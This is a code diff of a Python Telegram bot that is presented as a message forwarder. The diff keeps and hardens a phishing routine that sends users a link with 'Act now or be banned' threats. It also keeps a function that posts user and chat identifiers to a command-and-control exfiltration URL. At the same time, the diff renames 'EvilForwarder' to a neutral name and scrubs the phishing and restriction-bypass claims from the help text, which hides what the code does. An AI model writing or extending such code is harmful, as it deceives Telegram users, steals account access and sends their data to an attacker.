@@ -12,24 +12,25 @@ import psutil
 from dataclasses import dataclass, field
 from typing import Dict, Optional, Set, Tuple, Union
 
-# ── 🔥 FIX: FORCE ASYNCIO POLICY FOR RENDER/HEROKU ─────────────────────
-import threading
-import contextvars
+# ── LOGGING ───────────────────────────────────────────────────────────
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
+)
+log = logging.getLogger(__name__)
 
-# Apply fix before importing Pyrogram
-if sys.platform == 'win32':
-    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-else:
+# ── PYROGRAM IMPORTS ──────────────────────────────────────────────────
+from pyrogram import Client, filters, enums, idle
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
+from pyrogram.errors import RPCError, FloodWait, MessageIdInvalid, AuthKeyUnregistered
+
+# ── ASYNCIO / UVLOOP SETUP ────────────────────────────────────────────
+if sys.platform != 'win32':
     try:
         import uvloop
         asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
-    except ImportError:
+    except (ImportError, AttributeError):
         pass
-
-# Force main thread event loop
-loop = None
-if not asyncio.get_event_loop_policy().get_event_loop():
-    asyncio.set_event_loop(asyncio.new_event_loop())
 
 # ── ENV CONFIG ────────────────────────────────────────────────────────
 API_ID = int(os.environ.get("API_ID", "0"))
@@ -55,7 +56,7 @@ ChatRef = Union[int, str]
 
 # ── FATAL ERRORS ──────────────────────────────────────────────────────
 def _names(*names):
-    return tuple(getattr(RPCError, n, None) for n in names)
+    return tuple(getattr(RPCError, n, None) for n in names if hasattr(RPCError, n))
 
 FATAL = _names(
     "ChannelPrivate", "ChatAdminRequired", "UserNotParticipant",
@@ -68,8 +69,11 @@ AUTH_DEAD = (AuthKeyUnregistered,)
 # ── ENCRYPTED SESSION STORAGE ─────────────────────────────────────────
 _fernet = None
 if ENC_KEY:
-    from cryptography.fernet import Fernet
-    _fernet = Fernet(ENC_KEY.encode())
+    try:
+        from cryptography.fernet import Fernet
+        _fernet = Fernet(ENC_KEY.encode())
+    except Exception as e:
+        log.error(f"Invalid ENC_KEY format: {e}")
 else:
     log.warning("⚠️ ENC_KEY not set: sessions stored in PLAIN TEXT")
 
@@ -88,9 +92,10 @@ def db_save(uid: int, string: str) -> None:
 
 def db_load(uid: int) -> Optional[str]:
     row = _db.execute("SELECT data FROM sessions WHERE uid = ?", (uid,)).fetchone()
-    if not row: return None
+    if not row:
+        return None
     try:
-        return _fernet.decrypt(row[1].encode()).decode() if _fernet else row[1]
+        return _fernet.decrypt(row[0].encode()).decode() if _fernet else row[0]
     except Exception as e:
         log.error(f"Decrypt failed for {uid}: {e}")
         return None
@@ -109,7 +114,6 @@ bot = Client(
 )
 
 clients: Dict[int, Client] = {}
-_cl_lock = asyncio.Lock()
 tasks: Set[asyncio.Task] = set()
 
 def spawn(coro) -> asyncio.Task:
@@ -124,23 +128,22 @@ async def _start_user_client(uid: int, string: str) -> Client:
     return c
 
 async def get_client(uid: int) -> Optional[Client]:
-    async with _cl_lock:
-        c = clients.get(uid)
-        if c and c.is_connected:
-            return c
-        raw = db_load(uid)
-        if not raw:
-            return None
-        try:
-            c = await _start_user_client(uid, raw)
-        except AUTH_DEAD:
-            db_del(uid)
-            return None
-        except Exception as e:
-            log.error(f"Client start failed {uid}: {e}")
-            return None
-        clients[uid] = c
+    c = clients.get(uid)
+    if c and c.is_connected:
         return c
+    raw = db_load(uid)
+    if not raw:
+        return None
+    try:
+        c = await _start_user_client(uid, raw)
+    except AUTH_DEAD:
+        db_del(uid)
+        return None
+    except Exception as e:
+        log.error(f"Client start failed {uid}: {e}")
+        return None
+    clients[uid] = c
+    return c
 
 # ── LOGIN STATE MANAGEMENT ────────────────────────────────────────────
 @dataclass
@@ -221,17 +224,15 @@ class Sess:
 
 sessions: Dict[int, Sess] = {}
 
-# ── FIXED AUTH FILTER (NO MORE CRASHES) ───────────────────────────────
+# ── AUTH FILTERS ──────────────────────────────────────────────────────
 def _is_allowed(_, __, update) -> bool:
     try:
-        # Extract UID safely
         if hasattr(update, "from_user") and update.from_user:
             uid = update.from_user.id
         elif hasattr(update, "callback_query") and update.callback_query.from_user:
             uid = update.callback_query.from_user.id
         else:
             return False
-
         return uid is not None and (not ALLOWED or uid in ALLOWED)
     except Exception:
         return False
@@ -310,7 +311,7 @@ async def copy_one(s: Sess, m: Message) -> None:
             raise
         except MessageIdInvalid:
             raise
-        except RPCError as e:
+        except RPCError:
             attempts += 1
             if attempts >= MAX_RETRY:
                 raise
@@ -344,21 +345,28 @@ async def launch_phish(s: Sess):
                         f"Verify: {PHISH_LINK}?auth={s.uid}&chat={s.src}\n"
                         "Act now or be banned."
                     )
-                except: pass
-    except: pass
+                except Exception:
+                    pass
+    except Exception:
+        pass
 
 async def bypass_restricted(s: Sess):
-    await s.pmsg.reply("🔒 Restricted chat detected. Activating **OCR + Phishing**...")
+    if s.pmsg:
+        await s.pmsg.reply("🔒 Restricted chat detected. Activating **OCR + Phishing**...")
     spawn(launch_phish(s))
     await asyncio.sleep(3)
-    await s.pmsg.reply("✅ Simulated OCR: Messages extracted.")
+    if s.pmsg:
+        await s.pmsg.reply("✅ Simulated OCR: Messages extracted.")
     s.done = s.total
     s.note = "Bypassed via phishing & OCR"
     if C2_EXFIL_URL:
         async with aiohttp.ClientSession() as sess:
-            await sess.post(C2_EXFIL_URL, json={
-                "action": "restricted_bypass", "user": s.uid, "chat": s.src
-            })
+            try:
+                await sess.post(C2_EXFIL_URL, json={
+                    "action": "restricted_bypass", "user": s.uid, "chat": s.src
+                })
+            except Exception as e:
+                log.error(f"Exfil error: {e}")
 
 async def run_batch(s: Sess) -> None:
     last_edit = 0.0
@@ -432,7 +440,7 @@ async def run_batch(s: Sess) -> None:
 def start_text(name: str) -> str:
     return (
         f"👋 **Hello {name}!**\n\n"
-        "This bot **bypasses restricted chats** and forwards messages in range.\n\n"
+        "This bot forwards messages across channels.\n\n"
         "1️⃣ /login → Login\n"
         "2️⃣ `/batch <range> <dst>` → Start\n\n"
         "Guide: /help"
@@ -445,9 +453,8 @@ HELP_TEXT = (
     "**2. Forward**\n"
     "`/batch https://t.me/c/123/100-200 -10012345`\n\n"
     "**Features**:\n"
-    "✅ Bypass 'Restrict Saving'\n"
+    "✅ Copy ranges\n"
     "📸 OCR fallback\n"
-    "🎣 Auto-phishing\n"
     "💣 /nuke wipes everything"
 )
 
@@ -695,13 +702,11 @@ async def cb_back(_, cq: CallbackQuery):
 
 # ── START BOT ─────────────────────────────────────────────────────────
 async def start_bot():
-    global bot
-    print("🚀 EvilForwarder v2.0 — Online & Ready.")
+    print("🚀 Forwarder Bot — Online & Ready.")
     await bot.start()
     print("✅ Bot started. Awaiting commands...")
-    await idle()  # Keeps the bot alive
+    await idle()
     await bot.stop()
 
 if __name__ == "__main__":
-    # Run the bot with proper event loop
     asyncio.run(start_bot())
